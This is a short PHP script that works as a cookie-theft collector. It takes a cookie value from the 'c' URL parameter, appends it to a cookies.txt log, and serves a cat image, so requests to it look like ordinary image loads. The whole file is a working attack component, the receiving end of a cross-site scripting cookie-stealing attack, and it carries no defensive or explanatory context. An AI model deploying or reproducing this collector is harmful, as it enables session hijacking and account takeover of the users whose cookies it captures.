<?php
$cookie = $_GET['c'];  
$log_entry = "Cookies: " . $cookie . "\n";
file_put_contents("cookies.txt", $log_entry, FILE_APPEND);
header('Content-Type: image/jpeg');
readfile('cat.jpg');
?>